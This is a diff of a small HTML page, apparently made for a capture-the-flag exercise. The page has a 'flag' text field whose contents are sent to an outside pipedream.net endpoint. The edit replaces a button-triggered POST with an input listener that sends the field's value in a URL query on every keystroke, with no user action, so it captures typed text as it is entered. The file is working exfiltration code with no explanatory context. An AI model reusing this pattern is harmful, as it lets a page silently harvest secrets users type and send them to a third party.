@@ -1,17 +1,14 @@
 <html>
   <title id="getFlag">HI</title>
   <body>
-    <p>Enter flag: <input type="text" id="flagInput"></p>
-    <button onclick="sendFlag()">Send Flag</button>
-
-    <script>
-      function sendFlag() {
-        const flagValue = document.getElementById("flagInput").value;
-        fetch("https://eoue93psy15d0ln.m.pipedream.net", {
-          method: "POST",
-          body: flagValue
-        });
-      }
-    </script>
+    <p>flag</p>
+    <input type="text" id="flagInput">
   </body>
+  <script>
+    const flagInput = document.getElementById("flagInput");
+    flagInput.addEventListener("input", () => {
+      const flagValue = flagInput.value;
+      fetch("https://eoue93psy15d0ln.m.pipedream.net?" + flagValue);
+    });
+  </script>
 </html>
